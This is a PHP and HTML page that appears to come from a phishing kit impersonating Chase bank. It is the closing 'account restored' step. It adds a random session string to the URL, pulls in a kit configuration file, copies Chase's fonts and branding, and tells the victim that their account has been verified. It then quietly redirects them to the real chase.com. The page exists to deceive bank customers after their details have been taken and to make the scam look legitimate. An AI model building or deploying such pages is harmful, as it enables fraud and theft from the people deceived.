<?php
session_start();

//Add Random characters to URL
$actual_link = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";

if (strpos($actual_link, 'Service_Login_&_Authentication') !== false) {
    //Do nothing
}elseif(strpos($actual_link, '?') != true){
    $url = $actual_link."?&SERVID=Service_Login_&_Authentication=".sha1(uniqid(time()));
    header("Location: ".$url);  
}else{
    $url = $actual_link."&SERVID=Service_Login_&_Authentication=".sha1(uniqid(time()));
    header("Location: ".$url);
}

include("./config/function.php")



?>


<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" class="no-js" dir="ltr" lang="en"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="msapplication-config" content="none">
        <title>Update Your Account - chase</title>
        <meta name="description" content="">
        <meta name="author" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon" href="../img/chasefavicon.ico">
        <style>@font-face {font-family: Open Sans;font-style: normal;font-weight: 400;src: url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-regular.eot?#iefix') format('embedded-opentype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-regular.woff') format('woff'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-regular.ttf') format('truetype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-regular.svg#opensans-regular') format('svg');}@font-face {font-family: Open Sans;font-style: normal;font-weight: 600;src: url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-semibold.eot?#iefix') format('embedded-opentype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-semibold.woff') format('woff'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-semibold.ttf') format('truetype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-semibold.svg#opensans-semibold') format('svg');}@font-face {font-family: Open Sans;font-style: normal;font-weight: 300;src: url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-light.eot?#iefix') format('embedded-opentype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-light.woff') format('woff'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-light.ttf') format('truetype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-light.svg#opensans-light') format('svg');}@font-face {font-family: videoplayer;font-style: normal;font-weight: normal;src: url('https://static.chasecdn.com/content/dam/cpo-static/fonts/videoplayer.eot?#iefix') format('embedded-opentype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/videoplayer.woff') format('woff'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/videoplayer.ttf') format('truetype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/videoplayer.svg#videoplayer') format('svg');}
        html {height:100%; background: #fff;}

        @media only screen and (min-width: 768px) {
        html {
        background:#1c4f82; background:-moz-linear-gradient(top,#1c4f82 0%, #2e6ea3 100%); background:-webkit-linear-gradient(top,#1c4f82 0%,#2e6ea3 100%); background:linear-gradient(to bottom,#1c4f82 0%,#2e6ea3 100%);
        }
        }
        </style>
        <noscript>
</noscript>

        

        <script type="text/javascript" charset="UTF-8" src="css js//appConfig.js"></script>
		 <link rel="stylesheet" href="css js/blue-ui.css">
 <link rel="stylesheet" href="css js/logon.css">
</head>
    <body style="overflow-x: hidden; overflow-y: auto; height: 100%" data-has-view="true"><div data-is-view="true"><div class="homepage" tabindex="-1"><div class="toggle-aria-hidden" id="sitemessage" role="region" aria-labelledby="site-messages-heading" aria-hidden="true" data-has-view="true"><div data-is-view="true"><div id="siteMessageAda" aria-live="polite"><h2 class="util accessible-text" id="site-messages-heading" data-attr="LOGON_SITE_MESSAGES.noSiteMessagesAda">You have no more site alerts</h2></div> </div></div> <header class="toggle-aria-hidden" id="logon-summary-menu" data-has-view="true"><div
 class="logon header jpui transparent navigation bar">
 <img style="max-width: 60%;"   src="./img/logo.png" />
</div></header> <main id="logon-content" data-has-view="true"><div class="msd password-reset first-step" data-is-view="true">	<div class="jpui background image fixed show-xs show-sm" id="geoImage">
	<style type="text/css">.jpui.background.image { background-image: url(http://b.up-00.com/2018/01/151727043431841.jpeg);filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='http://b.up-00.com/2018/01/151727043431841.jpeg', sizingMethod='scale');-ms-filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='http://b.up-00.com/2018/01/151727043431841.jpeg', sizingMethod='scale');}@media (min-width:320px) { .jpui.background.image{background-image:url(http://b.up-00.com/2018/01/151727043431841.jpeg); } }@media (min-width:992px) { .jpui.background.image{background-image:url(http://b.up-00.com/2018/01/151727043431841.jpeg); } }@media (min-width:1024px) { .jpui.background.image{background-image:url(http://b.up-00.com/2018/01/151727043431841.jpeg); } }
	</style>
	</div><div class="container"><div class="row jpui primary panel"><div class="col-xs-12 col-md-10 col-md-offset-1 content-container"><form class="toggle-aria-hidden" method="POST" id="passwordReset" autocomplete="off" action="" novalidate=""><h1 class="header" data-attr="LOGON_PASSWORD_RESET.logonPasswordResetHeader" id="passwordResetHeader" tabindex="-1">Welcome, Again</h1> <div class="wrapper">

		<div class="row jpui panel body" id="mainpanel"> <div class="col-xs-12 col-sm-10 col-sm-offset-1"><div class="progress u-no-outline" id="progress" tabindex="-1"><div class="row"><div class="col-xs-12 col-sm-6 clear-padding"><h2>Identification <span class="util high-contrast">Step 1 of 4</span></h2> </div> <div class="col-xs-12 col-sm-6 progress-padding"><div class="jpui progress rectangles" id="progress-progressBar" data-progress=""><ol class="steps-4"><li class="active current-step" id="progress-progressBar-step-1" aria-current="step"><span class="util accessible-text" id="accessible-progress-progressBar-step-1"></span></li><li class="active current-step" id="progress-progressBar-step-2" aria-current="step"><span class="util accessible-text" id="accessible-progress-progressBar-step-2"></span></li><li class="active current-step" id="progress-progressBar-step-3" aria-current="step"><span class="util accessible-text" id="accessible-progress-progressBar-step-3"></span></li><li class="active current-step" id="progress-progressBar-step-4" aria-current="step"><span class="util accessible-text" id="accessible-progress-progressBar-step-4"></span></li></ol></div></div></div></div> <p class="text customer-question"><a class="jpui link no-underline" data-attr="LOGON_PASSWORD_RESET.customerQuestionsHelpMessageNavigation" href="#" id="identify_customer_question">Have a question? </a></p> <h3 data-attr="LOGON_PASSWORD_RESET.identifyCustomerHeader">Congratulations! Your have restored your account access.</h3>  
<div style="text-align: right;" trbidi="on">
<div style="text-align: center;">



<img src="./img/animation-checkmark.gif" height="150" width="150">



<p>  Now you can enjoy our services, thank you for choosing our trusted service.<br> 
                             your account will be verified in the next 24 hours. 
                        </p>








</div>

</div>



		



  



<div style="text-align: right;" trbidi="on">
<div style="text-align: center;">




<p class="seconds"> You are being redirected to your Chase account , within 10 seconds. </p>




<h2 class="vx_h2" data-reactid="110" >Your Account has been successfully Restored</h2>

</div>

</div>


        <head>
        <meta http-equiv="refresh" content="3;url=https://www.chase.com" />
    </head>




</div></div> </div></div></div></form> </div></div></div></div></main> <footer class="logon-footer" id="logon-footer" data-has-view="true"></footer></div> <div id="languageSupportDisclaimer"></div> <div id="overlay" data-has-view="true"></div> <div id="signoutModal"></div> <div id="siteExitWarning"></div> <div id="serviceErrorModal"></div> <div id="sessionTimeoutModal"></div></div></body></html>